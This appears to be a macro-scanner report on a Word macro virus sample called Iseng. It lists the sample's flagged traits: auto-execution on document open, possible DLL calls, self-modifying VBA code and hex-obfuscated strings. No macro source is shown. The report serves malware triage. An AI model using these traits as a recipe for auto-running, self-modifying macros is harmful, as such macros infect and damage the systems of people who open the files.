VBA FORM Variable "b'Okay'" IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Okay_Click          |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

